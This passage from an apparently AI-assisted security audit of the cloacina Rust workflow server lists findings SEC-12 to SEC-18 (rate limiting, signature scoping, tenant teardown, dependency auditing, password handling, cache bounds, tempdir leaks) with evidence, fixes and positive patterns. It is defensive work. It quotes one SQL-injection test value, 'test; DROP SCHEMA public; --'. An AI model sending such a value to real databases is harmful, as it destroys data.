Workflow tasks emit execution events whose `event_data` field is constructed from user-controlled task output. The DAL doesn't strip or validate it. If a downstream consumer (a UI, a SIEM ingester, an LLM workflow assistant) renders these events without escaping, a task can inject HTML/JS/control characters via its emitted event data. This is a stored-XSS / log-injection class of vulnerability that depends on the consumer's behavior — not exploitable through cloacina itself, but cloacina is the storage and read API.

Same shape applies to `triggers::get_trigger` (returns `cron_expression`, `trigger_name` as-is) and `workflows.rs::list_workflows` (returns `description` from user-supplied package.toml). None of these strip control characters or limit length.

#### Evidence

- `crates/cloacina-server/src/routes/executions.rs:236-238` — passthrough.
- `crates/cloacina-server/src/routes/workflows.rs:209-214` — passthrough of package_name/description from manifest.
- `crates/cloacina-server/src/routes/triggers.rs:46-58` — passthrough of trigger_name and cron_expression.

#### Suggested Resolution

For the API layer, document that all string fields are user-controlled and consumers must escape on render. Optionally, add a max-length cap on package descriptions, trigger names, etc., in the manifest validator. For event_data specifically, consider a size cap (e.g., 64KB) and a "no control characters in keys" validation.

---

### SEC-12: No HTTP rate limiting; 100MB body limit per request; WebSocket has no per-message size limit

**Severity**: Minor
**Location**: `crates/cloacina-server/src/lib.rs:486` (body limit); `crates/cloacina-server/Cargo.toml:43` (limit feature unused for rate); `crates/cloacina-server/src/routes/ws.rs:213` (WS read)
**Confidence**: High

#### Description

The server has:
- A 100MB total body limit on every request (`DefaultBodyLimit::max(100 * 1024 * 1024)`).
- `tower-http = { ..., features = ["cors", "trace", "limit"] }` — the `limit` feature is enabled but never used to install a `tower::limit::RateLimitLayer` or per-route concurrency cap.
- Project memory `project_soak_test_gaps.md` notes "rate limiter" as one of 5 major gaps from a soak test.

The accumulator WebSocket handler (`ws.rs:213-249`) reads incoming binary frames with no per-message size limit. axum's default WS message size is implementation-defined; for the underlying tungstenite, the default is 64MiB per message — large enough to exhaust per-tenant pool resources quickly. Combined with no rate limit on WS frame ingestion, an attacker with a single accumulator-write key can saturate the global registry's accumulator-send write lock (already noted in PERF) and eat memory.

There's also no concurrency limit on uploads: 100MB × N concurrent uploads × M tenants is a memory-pressure DoS vector if request bodies are buffered (axum buffers multipart bodies in memory by default).

#### Evidence

- `crates/cloacina-server/src/lib.rs:486` — body limit.
- `crates/cloacina-server/Cargo.toml:43` — `tower-http` `limit` feature enabled, never wired (`grep -rn "RateLimitLayer\|rate_limit\|tower::limit" crates/cloacina-server` returns 0).
- No CORS layer wired either despite `cors` feature being enabled (separate hygiene issue — defaults are typically permissive when not wired explicitly).
- Project memory references the rate-limiter gap.

#### Suggested Resolution

1. Add `tower_governor` or hand-roll a per-key rate limiter middleware with separate buckets for `auth_attempts`, `uploads`, `executes`, and `ws_connections`.
2. Set explicit per-route body limits — e.g., 10KB for JSON routes (overriding the 100MB default), keep 100MB only for `/v1/tenants/{id}/workflows`.
3. Configure WS `with_max_message_size` and `with_max_frame_size` on the upgrade — axum exposes these. Pin to e.g. 1MB per message.
4. Add per-key concurrency limits via `tower::limit::ConcurrencyLimitLayer` if the auth/key system can extract a stable identity at middleware time.

---

### SEC-13: Package signatures are global (not org-scoped); any signing key can sign any package and the verifier looks up by hash + fingerprint, not by binding

**Severity**: Minor
**Location**: `crates/cloacina/src/security/package_signer.rs:368-403`; `crates/cloacina/src/database/schema/postgres/package_signatures.sql` (implied)
**Confidence**: Medium

#### Description

`store_signature` stores a `(package_hash, key_fingerprint, signature, signed_at)` row with no `org_id` field. The verifier (`verify_package_bytes` at `verification.rs:380`) takes an `org_id` parameter, looks up the signature by `package_hash`, then checks if the signing fingerprint is in `find_trusted_key(org_id, fingerprint)`. So verification is "is the signing key in *this org's* trusted-key list," but the signature itself isn't tied to an org.

Two consequences:

1. **Global namespace for signatures.** If two distinct orgs' signers produce signatures for the same package hash (collision is possible if package hashes match — e.g., the same package is published in two contexts), they share a row. `find_signature` returns `Optional<single>`; `find_signatures` returns the multi-row form, used only for verification scan. Storage isn't scoped.

2. **Verification uses the *first* found signature.** `find_signature` does whatever DB ORDER BY happens to apply (per schema). The verifier `verify_package` at `package_signer.rs:427` does iterate all signatures and accept any trusted one — but that means if any of the `package_signatures` rows has a fingerprint trusted by `org_id`, the package verifies, even if a different org also signed it with an untrusted key. For the upload handler (`verify_package_bytes`) the same logic applies via `load_signature_from_db` returning the single row: if multiple signatures exist for the hash, only one is found, and which is non-deterministic.

This is a fail-open shape if combined with a signature-injection attack: an attacker who can write to `package_signatures` (e.g., a tenant with read-only access to `package_signatures` plus *any* signing-key write somewhere in the system) can register a signature with their own key for any package hash. The verifier then needs that key to be trusted by the relevant org — so this isn't directly exploitable, but the design narrows the trust boundary to "trust on first-write" of `package_signatures`.

#### Evidence

- `crates/cloacina/src/security/package_signer.rs:368-403` — `store_signature` schema.
- `crates/cloacina/src/security/package_signer.rs:537-593` — `find_signature_postgres` returns first row, no org filter.
- `crates/cloacina/src/security/verification.rs:380-467` — `verify_package_bytes` is the upload-time path.

#### Suggested Resolution

Add `org_id` (or `tenant_id`) to `package_signatures` rows. Make `find_signature` filter on it. Make `verify_package_bytes` pass the org_id forward. This narrows the trust boundary from "package_signatures table" to "package_signatures rows for this org."

For the global table case, document that `package_signatures` writes must come only from operator-controlled signing tools; a tenant-write path to this table would be a privilege escalation vector.

---

### SEC-14: Tenant deletion does not unregister loaded packages or schedule rows; admin keys, runners, and registries linger

**Severity**: Minor
**Location**: `crates/cloacina-server/src/routes/tenants.rs:92-115`; `crates/cloacina/src/database/admin.rs:241-303`
**Confidence**: Medium

#### Description

`remove_tenant` calls `DatabaseAdmin::remove_tenant` which:
1. Revokes per-table privileges.
2. Drops the user.
3. Drops the schema with CASCADE.

It does NOT:
- Revoke API keys scoped to the tenant (`tenant_id = schema_name`).
- Remove the tenant's `Database` from `TenantDatabaseCache`.
- Stop reactors/accumulators registered for that tenant in `EndpointRegistry`.
- Cancel any running workflow executions.

After `DELETE /v1/tenants/foo`:
- API keys with `tenant_id = "foo"` continue to authenticate. Their `can_access_tenant("foo")` still returns true (tenant_id match). Their queries to a `tenant_databases.resolve("foo", ...)` will reconnect — and because the schema no longer exists, search_path SET will fail (silently, COR-01) and the connection falls through to `public`. The tenant's revoked credentials now read from the admin schema.
- The runner's reactor instances tied to the tenant continue running, sending boundary events through registry channels and writing to (the now-dropped) tenant schema, generating cascading errors in logs.
- `TenantDatabaseCache.databases` retains the cached `Database` entry forever — a memory leak and a stale-pool hazard.

The schema is gone but the operational machinery isn't cleaned up.

#### Evidence

- `crates/cloacina-server/src/routes/tenants.rs:92-115` — handler stops at `admin.remove_tenant(...)`.
- `crates/cloacina/src/database/admin.rs:241-303` — admin only touches Postgres; no app-state cleanup.
- `crates/cloacina-server/src/lib.rs:43-92` — `TenantDatabaseCache` has no eviction.

#### Suggested Resolution

Make `remove_tenant` orchestrate the full teardown:

1. Mark the tenant as terminating (could use a soft-delete column on a `tenants` table — currently there is no such table).
2. Revoke all API keys with `tenant_id = schema_name`.
3. Stop reactors and accumulators registered for the tenant via `graph_scheduler.unload_for_tenant(tenant_id)`.
4. Cancel running workflow executions for the tenant.
5. Evict the tenant's `Database` from `TenantDatabaseCache`.
6. Then run `admin.remove_tenant(...)` for the actual schema drop.
7. Audit-log the full teardown.

---

### SEC-15: `cargo audit` runs nightly with `continue-on-error: true`; `cargo deny` not configured

**Severity**: Minor
**Location**: `.github/workflows/nightly.yml:110-126`; absent `deny.toml`
**Confidence**: High

#### Description

Dependency vulnerability scanning is configured to run nightly via cargo-audit (`nightly.yml:110-126`) but with `continue-on-error: true` (line 114). When `cargo audit` reports an advisory, the job is marked successful regardless. The downstream `notify-failure` job aggregates `[cloacina-tests, examples-docs, coverage, macos-integration, cargo-audit]` (line 184) — but because cargo-audit doesn't fail, advisories produce neither an issue nor a notification. The audit output is reachable only by clicking into the run logs.

There is no `cargo deny` configuration (`deny.toml` not present) — so:
- License compliance is not gated.
- Banned dependencies are not enforced.
- Sources (only crates.io vs. arbitrary git) are not restricted.
- Duplicate-crate detection is not enforced.

For a project that loads native code from third-party packages (the `.cloacina` build path) and intentionally pulls a large dependency tree (rdkafka, pyo3, diesel, axum), `cargo deny` is the conventional defense.

#### Evidence

- `.github/workflows/nightly.yml:114` — `continue-on-error: true`.
- `find / -name 'deny.toml'` — not present.
- `Cargo.lock` shows several known-mature deps (`rdkafka 0.39`, `pyo3` ecosystem) — no audit-deny visibility.

#### Suggested Resolution

1. Remove `continue-on-error: true` from cargo-audit. Drop the workflow on advisory.
2. Add `deny.toml` with at least `[advisories]`, `[bans]`, `[licenses]` (deny `GPL-3.0` etc. if license matters), `[sources]` (allow only `crates-io`).
3. Run `cargo deny check` in `ci.yml` (not just nightly) so PRs catch new advisories.
4. Pin `tokio`, `diesel`, `axum`, `pyo3`, `rdkafka` minor versions in workspace `Cargo.toml` so dep upgrades go through PR.

---

### SEC-16: Tenant `password` accepted via plaintext in JSON request body, then stored in the DB; no transport encryption guarantee

**Severity**: Minor
**Location**: `crates/cloacina-server/src/routes/tenants.rs:39-47, 60-66`
**Confidence**: High

#### Description

`POST /v1/tenants` accepts:

```json
{"schema_name": "...", "username": "...", "password": "..."}
```

The password is the Postgres user's password — the credential the tenant will use to connect. The handler:
1. Receives it over HTTP. Server has no TLS (`lib.rs:193` warns at startup); operators must front-end a TLS proxy.
2. Passes it to `DatabaseAdmin::create_tenant(config)` which embeds it (escaped) into a `CREATE USER {} WITH PASSWORD '{}'` SQL statement. The password lands in the Postgres role, where it's hashed at-rest by Postgres itself (modern Postgres uses SCRAM-SHA-256 by default). That part is fine.
3. The plaintext is also returned to the caller in `TenantCredentials`, but the route deliberately strips it from the response (commented at `tenants.rs:70-73`, T-0557 fix).

Risks:
- The password is in transit unencrypted unless the operator has wired TLS upstream. The startup warning is good but easy to miss.
- The password sits in the request body which is logged at `info!` level by request-tracing middleware (`lib.rs:355-360` logs path/method but not body — that's fine). However, axum's default body handling can leave body bytes accessible to log capture if a future `tower-http::trace::TraceLayer` is wired without filtering.
- The request body is buffered (multipart-style or JSON) by axum and may be retained in memory longer than the handler's lifetime; `serde_json` parses the entire blob upfront. There's no zeroize-on-drop on the password field. (Best-practice minor.)

#### Evidence

- `crates/cloacina-server/src/routes/tenants.rs:39-47, 60-66`
- `crates/cloacina-server/src/lib.rs:193` — TLS warning.
- `crates/cloacina/src/database/admin.rs:108-237` — escape and embed.

#### Suggested Resolution

1. Recommend (and enforce in deployment docs) that operators mTLS or front the server with a TLS-terminating proxy.
2. Optionally accept passwords only as a file path or via an out-of-band channel (e.g., generate-and-return-once, never accept-from-input).
3. Use `secrecy::SecretString` (or `zeroize`) for the password field so it's wiped on drop and not accidentally logged via `Debug`.
4. Add a request-size cap on `/v1/tenants` POST (currently 100MB body limit applies — wildly oversized for a 3-field JSON object).

---

### SEC-17: Tenant DB cache is unbounded; tenant string is the cache key with no eviction

**Severity**: Minor
**Location**: `crates/cloacina-server/src/lib.rs:43-92`
**Confidence**: High

#### Description

`TenantDatabaseCache::resolve` lazily creates a per-tenant `Database` (with a 2-connection pool) and inserts it into a `tokio::sync::RwLock<HashMap<String, Database>>`. There's no:

- Max entries cap.
- LRU eviction.
- TTL.
- Removal on `tenant_remove`.

Memory cost per tenant: the DB struct (2 connections + manager state). Two issues:

1. **Memory exhaustion as a DoS vector.** An admin key can call `POST /v1/tenants` repeatedly to grow the cache without bound; or an attacker who controls the tenant URL path (`/v1/tenants/{tenant_id}/workflows`) without admin can call `list_workflows` for distinct random `tenant_id` values — each call attempts a `resolve` which tries `try_new_with_schema` and either succeeds (creating a pool) or fails fast. Failed creates don't poison the cache, but successful ones never evict. A misconfigured Postgres that accepts connections to non-existent schemas (some configurations) compounds the risk.

2. **Tenant deletion doesn't evict.** Per SEC-14, removing a tenant doesn't clean the cache. Connections to the dropped schema continue to be issued and silently fall through to `public` (COR-01).

#### Evidence

- `crates/cloacina-server/src/lib.rs:43-92` — full impl.
- No `evict`, `remove`, or capacity bound.

#### Suggested Resolution

Bound the cache (e.g., LRU with 256 entries). Evict on `remove_tenant`. Surface a metric `cloacina_tenant_cache_size`. Make resolution failures NOT cache (already the case, but document it).

---

### SEC-18: `mem::forget(temp_dir)` per Rust package load → temp files containing executable cdylib bytes accumulate forever in `/tmp`

**Severity**: Minor
**Location**: `crates/cloacina/src/registry/reconciler/loading.rs:91-97`; `crates/cloacina/src/registry/loader/package_loader.rs` (similar pattern)
**Confidence**: High

#### Description

Already noted as `COR-05`. Security angle:

- The leaked tempdir path is predictable per `tempfile::TempDir::new` semantics (random suffix in `/tmp`) — not a name-collision attack vector.
- The leaked file is a fully-loaded executable cdylib. On the daemon's host, it remains world-readable (default tempfile perms 0600 to creator only — let me confirm):

Confirmed: `tempfile::TempDir::new` creates with default `O_RDWR | O_CREAT | O_EXCL` and 0600 perms inherited from umask, so file readability is bounded to the daemon's UID. Good.

- Disk fill: a daemon that hot-reloads packages (which is the design — every package version load leaks a tempdir) accumulates `.cloacina` artifacts in `/tmp` until process restart. For a long-running multi-tenant deployment with frequent uploads, `/tmp` exhaustion is a real DoS vector.
- A subverted Linux process exposing `/proc/<pid>/maps` to other users (default for some setups) leaks the path and bytes of the loaded cdylib, but at that point the process's address space is already compromised.

The security risk is bounded; the operational risk (already in COR-05) is the larger concern.

#### Evidence

- `crates/cloacina/src/registry/reconciler/loading.rs:91-97`
- `tempfile` docs confirm 0600.

#### Suggested Resolution

Per `COR-05`: hold the `TempDir` in the reconciler's `PackageState` so it drops with the package's lifecycle. Also: add a metric on per-process tempdir count to detect leaks operationally.

**Cross-cutting note**: `COR-05`.

---

## Positive Patterns

- **PostgreSQL identifier validation has its own dedicated module with thorough tests.** `crates/cloacina/src/database/connection/schema_validation.rs` enforces NAMEDATALEN length, allowed character set, leading-character rules, and a reserved-name list; the test module includes SQL-injection-attempt fixtures (e.g., `validate_schema_name("test; DROP SCHEMA public; --")`). Username validation has the same shape including reserved Postgres role names. Unicode characters are explicitly rejected. This is what an SQL-injection-defense story should look like.
- **Bootstrap admin key is mode-0600 and never logged.** `crates/cloacina-server/src/lib.rs:606-655` writes the plaintext to `~/.cloacina/bootstrap-key` with `set_permissions(0o600)` on Unix and prints only the file path. The plaintext touches stdout/stderr exactly once at the path-confirmation log line, which is the bare minimum information leak (and necessary for the operator to find the key).
- **`scripts/check_credential_logging.py` lints log/print macros for sensitive identifiers.** A real lint, with a careful regex that strips literals before searching, an `// allow(credential-logging)` opt-out comment for false positives, and CI integration (`.github/workflows/ci.yml`). It runs on every PR. It's narrow (4 sensitive names, 9 macros) but it's there.
- **The WebSocket auth ticket store is a deliberate response to "API keys in URLs are bad."** `crates/cloacina-server/src/routes/auth.rs:262-332` issues single-use, 60s-TTL tickets that are consumed on WS upgrade. Tickets are bounded (max 1024), expired-evicted on issue, and have proper unit tests for single-use, expiry, and capacity. This is correctly designed for the constraint that browser WS clients can't set custom headers.
- **Ed25519 signing with AES-256-GCM at-rest encryption of private keys.** `crypto/signing.rs` and `crypto/key_encryption.rs` use modern primitives (ed25519-dalek, aes-gcm), proper random nonce generation per encryption, and a clean separation between signing-key storage and signing operation. Key fingerprints are SHA-256 of the public key (stable, indexable). Detached `.sig` files are JSON for portability and the signature byte field is base64-encoded — interoperable with non-Rust verifiers.
- **The `RUNNING_WITHOUT_TLS` warning at server startup is loud and explicit.** `crates/cloacina-server/src/lib.rs:193` — `warn!("Server running without TLS — use a TLS-terminating reverse proxy …")`. Operator-facing, accurate, and at the right log level. The kind of operational message that prevents a class of bug.
